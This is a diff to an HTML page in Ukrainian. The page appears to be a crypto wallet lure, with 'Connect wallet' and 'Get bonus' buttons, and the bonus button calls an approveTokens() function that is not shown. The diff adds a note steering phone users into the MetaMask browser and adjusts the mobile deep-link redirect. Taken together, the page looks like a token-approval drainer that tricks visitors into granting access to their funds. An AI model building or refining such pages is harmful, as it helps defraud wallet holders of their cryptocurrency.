@@ -36,6 +36,11 @@
     button:hover {
       background: #0097a7;
     }
+    .note {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
   </style>
 </head>
 <body>
@@ -44,6 +49,7 @@
     <p id="info">Працює на ПК та мобільному<br>Натисніть кнопку для підключення</p>
     <button onclick="connectWallet()">🔐 Підключити гаманець</button>
     <button onclick="approveTokens()">✅ Отримати бонус</button>
+    <p class="note">* Для роботи на телефоні відкрий сайт у браузері MetaMask</p>
   </div>
 
   <script>
@@ -60,8 +66,8 @@
         } else {
           const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
           if (isMobile) {
-            const currentUrl = encodeURIComponent(window.location.href);
-            window.location.href = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
+            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+            window.location.href = `https://metamask.app.link/dapp/${cleanUrl}`;
           } else {
             alert("🛑 Ваш браузер не підтримує Web3. Встановіть MetaMask.");
           }
